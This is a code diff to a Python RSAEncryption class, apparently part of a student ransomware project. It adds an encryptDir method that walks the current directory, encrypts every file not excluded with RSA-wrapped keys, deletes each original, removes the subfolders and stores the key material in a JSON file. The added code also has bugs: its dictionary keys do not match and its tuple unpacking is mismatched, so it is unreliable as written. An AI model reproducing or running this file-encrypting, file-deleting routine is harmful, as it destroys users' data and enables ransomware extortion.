@@ -1,4 +1,4 @@
-import os, var
+import os, var, json, base64
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding, hashes, hmac, serialization
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -66,7 +66,7 @@ class RSAEncryption:
     # padding mode. The result will be RSACipher. 
     # You then return (RSACipher, C, IV, ext).
     def encryptRSA(self, filepath, RSA_Publickey_Filepath):
-        # (CT, ekey, hkey, iv, tag, ext) = MyfileEncryptMAC(filepath)
+        # (ct, ekey, hkey, iv, tag, ext) = MyfileEncryptMAC(filepath)
         ct, ek, hk, iv, htag, ext = self.fileEncryptHMAC(filepath)
 
         # Initialize RSA Public Key Encryption Object
@@ -114,7 +114,7 @@ class RSAEncryption:
         # Get file name and extension
         filename, ext = os.path.splitext(filepath)
         # Creates an out file path with ".encrypt" file type
-        out = filename + var.ENCEXT
+        # out = filename + var.ENCEXT
 
         # Open file in read-binary mode
         # Read binary data to bytedata
@@ -127,9 +127,9 @@ class RSAEncryption:
 
         # write encrypted file data to the newly created file path
         # write is done in write-binary mode
-        encryptFile = open(out, "wb")
-        encryptFile.write(cipher_text)
-        encryptFile.close()
+        # encryptFile = open(out, "wb")
+        # encryptFile.write(cipher_text)
+        # encryptFile.close()
     
         return cipher_text, self.ENCKEY, self.HMACKEY, iv, htag, ext
 
@@ -218,3 +218,39 @@ class RSAEncryption:
         plain_text = unpadder.update(pt) + unpadder.finalize()
     
         return plain_text
+
+    def encryptDir(self):
+        currentDir = os.getcwd()
+        filesList = []
+
+        # Fetch a list of all files within the root directory
+        for root, dirs, files in os.walk(currentDir):
+            for file in files:
+                file = root + "\\" + file
+                if file not in filesList and file.split("\\")[-1] not in var.EXCLUSIONS:
+                    filesList.append(file)
+                    
+        encryptedFiles = []
+
+        # Encrypting each files in the list of files
+        for file in filesList:
+            # Returns  RSACipher, ct, iv, htag, ext
+            data = self.encryptRSA(file, "public.pem")
+            data = {"RSACipher": data[0], "CT": data[1], "IV": data[2], "tag": data[3], "ext": data[4]}
+            data["RSACipher"] = base64.encodebytes(data["RSACipher"]).decode("ascii")
+            data["CT"] = base64.encodebytes(data["CT"]).decode("ascii")
+            data["IV"] = base64.encodebytes(data["IV"]).decode("ascii")
+            data["TAG"] = base64.encodebytes(data["TAG"]).decode("ascii")
+            data["EXT"] = base64.encodebytes(data["EXT"]).decode("ascii")
+            encryptedFiles.append(data)
+            os.remove(file)
+
+        # Removing empty subfolders
+        for root, dirs, files in os.walk(currentDir, topdown = False):
+            for dirName in dirs:
+                os.rmdir(os.path.realpath(os.path.join(root, dirName)))
+        
+        # Writing encryption data to JSON file
+        with open("encFile.json", "w") as jFile:    
+            encryptedFiles = json.dumps(encryptedFiles)
+            jFile.write(encryptedFiles)
